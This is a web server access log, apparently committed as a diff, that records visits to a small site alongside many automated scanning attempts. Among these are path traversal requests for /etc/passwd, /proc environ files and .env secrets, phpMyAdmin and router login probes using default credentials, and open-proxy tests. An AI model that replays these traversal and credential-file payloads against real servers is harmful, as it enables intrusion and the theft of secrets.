+INFO:     66.132.195.238:33730 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE1.png HTTP/1.1" 200 OK
+INFO:     66.132.195.238:57686 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE2.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.238:55474 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.159.166:46620 - "GET /info.php HTTP/1.1" 404 Not Found
+INFO:     43.153.100.234:38726 - "GET / HTTP/1.1" 200 OK
+INFO:     43.153.86.78:38252 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     172.239.96.59:40987 - "GET / HTTP/1.1" 200 OK
+INFO:     172.239.96.59:40987 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     199.165.159.73:13542 - "GET / HTTP/1.1" 200 OK
+INFO:     122.226.204.5:6500 - "GET / HTTP/1.1" 200 OK
+INFO:     199.165.159.78:52463 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     199.165.159.73:46478 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     199.165.159.73:59610 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     102.220.163.241:54416 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     34.38.190.31:44164 - "GET / HTTP/1.1" 200 OK
+INFO:     34.1.255.26:32350 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     35.214.219.89:9054 - "GET / HTTP/1.1" 200 OK
+INFO:     35.214.219.89:9062 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     35.214.219.89:9070 - "GET /pub/ HTTP/1.1" 404 Not Found
+INFO:     35.214.219.89:9072 - "OPTIONS / HTTP/1.1" 405 Method Not Allowed
+INFO:     35.214.219.89:9086 - "OJFS / HTTP/1.1" 405 Method Not Allowed
+INFO:     35.214.219.89:9090 - "GET /files/ HTTP/1.1" 404 Not Found
+INFO:     35.214.219.89:9102 - "HEAD / HTTP/1.1" 405 Method Not Allowed
+INFO:     35.214.219.89:9130 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     35.214.219.89:9114 - "GET /downloads/ HTTP/1.1" 404 Not Found
+INFO:     35.214.219.89:9138 - "OPTIONS / HTTP/1.1" 405 Method Not Allowed
+INFO:     47.95.204.107:46164 - "GET / HTTP/1.1" 200 OK
+INFO:     49.51.243.95:33832 - "GET / HTTP/1.1" 200 OK
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.10.1.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.10.2.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.10.0.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.10.0.1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.10.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.11.0.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.11.1.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.11.1.1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.6.1-pl2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.6.1-pl3/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     102.208.216.113:47330 - "GET /phpMyAdmin-2.6.4-pl3/scripts/setup.php HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.198.224.238:40872 - "CONNECT 1.1.1.1%3A443 HTTP/1.1" 404 Not Found
+INFO:     112.94.252.90:62568 - "HEAD http%3A//110.242.68.4/ HTTP/1.1" 404 Not Found
+INFO:     139.170.72.123:41011 - "CONNECT cn.bing.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     111.113.89.103:63476 - "GET http%3A//www.wujieliulan.com/ HTTP/1.1" 404 Not Found
+INFO:     112.94.253.183:52210 - "CONNECT www.baidu.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     123.245.85.67:42175 - "GET http%3A//dongtaiwang.com/ HTTP/1.1" 404 Not Found
+INFO:     220.174.31.160:42752 - "CONNECT www.so.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     117.15.89.107:23232 - "GET http%3A//www.minghui.org/ HTTP/1.1" 404 Not Found
+INFO:     118.212.121.254:46444 - "GET http%3A//www.soso.com/ HTTP/1.1" 404 Not Found
+INFO:     182.242.169.25:56939 - "GET http%3A//www.rfa.org/english/ HTTP/1.1" 404 Not Found
+INFO:     139.170.73.159:29061 - "GET http%3A//www.epochtimes.com/ HTTP/1.1" 404 Not Found
+INFO:     139.212.69.170:21882 - "CONNECT www.voanews.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     185.226.93.242:60444 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     187.17.228.241:62085 - "GET /admin/config.php HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     43.157.43.147:48332 - "GET / HTTP/1.1" 200 OK
+INFO:     188.166.127.35:35780 - "GET / HTTP/1.1" 200 OK
+INFO:     188.166.127.35:35780 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     205.172.161.237:48578 - "GET /files/../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:48584 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     216.25.90.65:65028 - "GET / HTTP/1.1" 200 OK
+INFO:     172.236.228.224:57082 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     172.236.228.38:38032 - "GET / HTTP/1.1" 200 OK
+INFO:     205.172.161.237:33138 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:33154 - "GET /files/../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     45.156.128.92:19372 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.128.92:53478 - "GET /api/ HTTP/1.1" 404 Not Found
+INFO:     43.166.134.114:42108 - "GET / HTTP/1.1" 200 OK
+INFO:     45.153.34.178:49092 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     173.255.225.25:49630 - "GET / HTTP/1.1" 200 OK
+INFO:     85.11.167.204:34806 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:41904 - "GET /files/../../../../../../../../../../../../proc/self/cwd/.env HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:41908 - "GET /cgi-bin/../../../../proc/self/cwd/.env HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:53520 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     45.79.181.251:40848 - "GET / HTTP/1.1" 200 OK
+INFO:     205.172.161.237:40372 - "GET /files/../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:54678 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     212.129.34.236:49006 - "GET / HTTP/1.1" 200 OK
+INFO:     212.129.34.236:49006 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     212.129.34.236:55842 - "GET /HNAP1 HTTP/1.1" 404 Not Found
+INFO:     212.129.34.236:58716 - "GET / HTTP/1.1" 200 OK
+INFO:     212.129.34.236:58732 - "GET / HTTP/1.1" 200 OK
+INFO:     212.129.34.236:52242 - "GET / HTTP/1.1" 200 OK
+INFO:     212.129.34.236:54694 - "POST /onvif/device_service HTTP/1.1" 404 Not Found
+INFO:     212.129.34.236:54696 - "GET /PSIA/index HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:55458 - "GET /files/../../../../../../../../../../../../proc/self/cwd/.env HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:55458 - "GET /cgi-bin/../../../../proc/self/cwd/.env HTTP/1.1" 404 Not Found
+INFO:     162.35.125.195:53792 - "GET / HTTP/1.1" 200 OK
+INFO:     120.27.149.138:35020 - "GET / HTTP/1.0" 200 OK
+INFO:     120.27.149.138:36454 - "POST /sdk HTTP/1.1" 404 Not Found
+INFO:     120.27.149.138:36446 - "GET /nmaplowercheck1795115664 HTTP/1.1" 404 Not Found
+INFO:     120.27.149.138:36442 - "GET / HTTP/1.0" 200 OK
+INFO:     120.27.149.138:36470 - "GET /evox/about HTTP/1.1" 404 Not Found
+INFO:     120.27.149.138:36484 - "GET /HNAP1 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     120.27.149.138:37726 - "GET / HTTP/1.0" 200 OK
+INFO:     120.27.149.138:37732 - "GET / HTTP/1.1" 200 OK
+INFO:     67.207.90.206:60462 - "GET / HTTP/1.1" 200 OK
+INFO:     67.207.90.206:33560 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     8.208.11.11:46360 - "CONNECT proxy.h-acker.cc%3A80 HTTP/1.1" 404 Not Found
+INFO:     8.208.11.11:46374 - "GET http%3A//proxy.h-acker.cc/probe?token=d5a63174c21c8538 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     207.175.103.117:39412 - "GET / HTTP/1.1" 200 OK
+INFO:     94.102.49.190:59636 - "GET / HTTP/1.1" 200 OK
+INFO:     94.102.49.190:59638 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:59640 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:38194 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:38208 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     102.220.163.241:61834 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     102.220.163.241:61834 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     121.41.167.184:48290 - "GET / HTTP/1.1" 200 OK
+INFO:     121.41.167.184:48310 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     54.210.186.19:9804 - "GET / HTTP/1.1" 200 OK
+INFO:     54.210.186.19:9816 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     54.210.186.19:9824 - "GET / HTTP/1.1" 200 OK
+INFO:     54.210.186.19:9830 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     45.156.87.63:40394 - "GET / HTTP/1.1" 200 OK
+INFO:     205.210.31.251:60834 - "GET /metrics HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.79:25260 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.195.79:28284 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.79:28300 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     66.132.195.79:59034 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     66.132.195.79:15960 - "GET /static/css/home.css HTTP/1.1" 200 OK
+INFO:     205.172.161.237:59800 - "GET /files/../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /files/../../../../../../../../../../../../proc/self/environ HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /files/../../../../../../../../../../../../proc/1/environ HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /files/../../../../../../../../../../../../proc/self/cmdline HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /files/../../../../../../../../../../../../proc/1/cmdline HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /cgi-bin/../../../../proc/self/environ HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /cgi-bin/../../../../proc/1/environ HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /cgi-bin/../../../../proc/self/cmdline HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /cgi-bin/../../../../proc/1/cmdline HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /files/../../../../../../../../../../../../proc/self/cwd/.env HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /files/../../../../../../../../../../../../.env HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /files/../../../../../../../../../../../../app/.env HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /cgi-bin/../../../../proc/self/cwd/.env HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /cgi-bin/../../../../.env HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59800 - "GET /cgi-bin/../../../../app/.env HTTP/1.1" 404 Not Found
+INFO:     66.132.195.79:60790 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.79:50202 - "GET /phpinfo HTTP/1.1" 404 Not Found
+INFO:     170.106.161.78:35376 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.193.193:37572 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     40.74.212.9:39624 - "GET /druid/index.html HTTP/1.1" 404 Not Found
+INFO:     176.65.149.236:48649 - "GET / HTTP/1.1" 200 OK
+INFO:     18.116.101.220:41464 - "GET / HTTP/1.1" 200 OK
+INFO:     18.116.101.220:58208 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     139.59.37.187:50078 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.135.193.193:47330 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     190.142.177.56:10211 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     46.151.178.14:37864 - "GET / HTTP/1.1" 200 OK
+INFO:     46.151.178.14:37876 - "GET /autodiscover/autodiscover.xml HTTP/1.1" 404 Not Found
+INFO:     46.151.178.14:37884 - "GET /ews/exchange.asmx HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     8.208.11.11:52574 - "CONNECT proxy.h-acker.cc%3A80 HTTP/1.1" 404 Not Found
+INFO:     8.208.11.11:52582 - "GET http%3A//proxy.h-acker.cc/probe?token=07a6a587901fb373 HTTP/1.1" 404 Not Found
+INFO:     194.88.98.105:2942 - "GET / HTTP/1.1" 200 OK
+INFO:     69.5.169.51:6480 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     194.88.98.85:15224 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     69.5.169.85:2888 - "GET /mcp/ HTTP/1.1" 404 Not Found
+INFO:     69.5.169.46:11082 - "GET /mcp HTTP/1.1" 404 Not Found
+INFO:     69.5.169.76:12596 - "GET / HTTP/1.1" 200 OK
+INFO:     69.5.169.44:3018 - "GET /api/mcp HTTP/1.1" 404 Not Found
+INFO:     69.5.169.92:7710 - "GET /sse HTTP/1.1" 404 Not Found
+INFO:     43.161.217.205:40616 - "GET / HTTP/1.1" 200 OK
+INFO:     3.82.148.1:45718 - "GET / HTTP/1.1" 200 OK
+INFO:     205.210.31.223:52300 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     23.132.164.201:52562 - "GET /.git/config HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     149.56.31.99:29824 - "CONNECT chek.zennolab.com%3A443 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     147.185.132.88:49603 - "GET / HTTP/1.0" 200 OK
+INFO:     86.54.31.38:49822 - "GET / HTTP/1.1" 200 OK
+INFO:     86.54.31.38:53494 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     86.54.31.38:56144 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     86.54.31.38:58290 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     86.54.31.38:34062 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     165.227.84.134:24153 - "GET / HTTP/1.1" 200 OK
+INFO:     86.54.31.38:58344 - "GET / HTTP/1.1" 200 OK
+INFO:     86.54.31.38:34058 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     86.54.31.38:37008 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     86.54.31.38:39230 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     86.54.31.38:43268 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     188.166.61.251:44454 - "GET / HTTP/1.1" 200 OK
+INFO:     188.166.61.251:44454 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     172.239.71.245:47360 - "GET / HTTP/1.1" 200 OK
+INFO:     185.247.137.146:39049 - "GET / HTTP/1.1" 200 OK
+INFO:     195.96.139.110:59517 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     165.227.147.215:34768 - "GET /aaa9 HTTP/1.1" 404 Not Found
+INFO:     165.227.147.215:34774 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     35.210.122.87:12272 - "GET / HTTP/1.1" 200 OK
+INFO:     207.175.103.117:11474 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.193.193:48668 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     96.126.107.202:41646 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     96.126.107.202:41662 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     188.240.59.56:39802 - "GET / HTTP/1.1" 200 OK
+INFO:     124.120.43.101:10304 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     43.130.154.56:41470 - "GET / HTTP/1.1" 200 OK
+INFO:     35.214.212.196:54828 - "GET / HTTP/1.1" 200 OK
+INFO:     4.148.17.55:57606 - "GET /portal/redlion HTTP/1.1" 404 Not Found
+INFO:     45.77.61.56:47158 - "GET / HTTP/1.1" 200 OK
+INFO:     201.79.43.222:42428 - "GET /SDK/webLanguage HTTP/1.1" 404 Not Found
+INFO:     3.70.222.170:35686 - "GET / HTTP/1.1" 200 OK
+INFO:     43.135.140.225:53622 - "GET / HTTP/1.1" 200 OK
+INFO:     45.144.212.158:52222 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     185.110.47.220:1303 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.128.214:22740 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     27.215.215.163:60517 - "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 Not Found
+INFO:     184.105.247.195:61820 - "GET / HTTP/1.1" 200 OK
+INFO:     184.105.247.195:25464 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     184.105.247.195:12052 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     184.105.247.195:39184 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     35.240.97.242:55260 - "GET / HTTP/1.1" 200 OK
+INFO:     201.3.127.133:45468 - "GET http%3A//43.248.3.158%3A22222/ HTTP/1.1" 404 Not Found
+INFO:     43.128.156.124:47346 - "GET / HTTP/1.1" 200 OK
+INFO:     40.67.178.181:44498 - "GET / HTTP/1.1" 200 OK
+INFO:     43.143.161.50:48154 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     43.143.161.50:44820 - "GET / HTTP/1.1" 200 OK
+INFO:     43.143.161.50:44824 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     123.57.94.58:42538 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:33138 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:50806 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:34266 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:58336 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:42374 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.211:22854 - "GET / HTTP/1.1" 200 OK
+INFO:     123.57.94.58:56706 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     66.132.195.211:22862 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.211:32910 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:32918 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     123.57.94.58:44706 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     66.132.195.211:43566 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     66.132.195.211:10604 - "GET /static/css/home.css HTTP/1.1" 200 OK
+INFO:     66.132.195.211:4212 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:4216 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:4222 - "GET /static/img/%E7%94%A8%E6%88%B7.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:4234 - "GET /static/img/shopping%20car.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:40410 - "GET /static/img/%E9%93%83%E9%93%9B-1.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:40416 - "GET /static/img/%E9%BD%BF%E8%BD%AE.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:40424 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE1.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:36328 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE2.png HTTP/1.1" 200 OK
+INFO:     123.57.94.58:51384 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     66.132.195.211:31764 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE3.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:3250 - "GET /static/img/%E6%A8%A1%E5%9E%8B%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     66.132.195.211:50936 - "GET /static/img/%E6%B8%B2%E6%9F%93%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     123.57.94.58:33122 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     66.132.195.211:45144 - "GET /static/img/%E6%88%90%E5%93%81%E5%9B%BE.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.211:44626 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     123.57.94.58:55232 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:51036 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:54676 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:57290 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:38184 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:55874 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     123.57.94.58:55748 - "HEAD / HTTP/1.0" 405 Method Not Allowed
+INFO:     43.132.214.228:48700 - "GET / HTTP/1.1" 200 OK
+INFO:     4.150.194.44:59304 - "GET /developmentserver/metadatauploader HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.172.100:3872 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.172.100:3880 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.172.100:3882 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     66.132.172.100:63142 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     66.132.172.100:46630 - "GET /static/img/%E6%B8%B2%E6%9F%93%E5%9B%BE.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.172.100:46646 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     207.175.103.117:65316 - "GET / HTTP/1.1" 200 OK
+INFO:     71.6.155.70:65093 - "GET / HTTP/1.1" 200 OK
+INFO:     45.153.34.230:41650 - "CONNECT ip-api.com%3A80 HTTP/1.1" 404 Not Found
+INFO:     45.153.34.230:41644 - "GET http%3A//ip-api.com/json/?fields=status,query,country,countryCode,isp,proxy,hosting HTTP/1.1" 404 Not Found
+INFO:     43.160.219.138:42058 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Unsupported upgrade request.
+WARNING:  No supported WebSocket library detected. Please use "pip install 'uvicorn[standard]'", or install 'websockets' or 'wsproto' manually.
+INFO:     39.100.68.207:52368 - "GET / HTTP/1.1" 200 OK
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.10.1.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.10.2.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.10.0.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.10.0.1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.10.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.11.0.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.11.1.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.11.1.1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.6.1-pl2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.6.1-pl3/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.6.4-pl3/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.6.4-pl4/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.6.4-rc1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.6.5/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.6.6/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.6.9/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.7.0-beta1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.7.0-pl1/scripts/setup.php HTTP/1.1" 404 Not Found
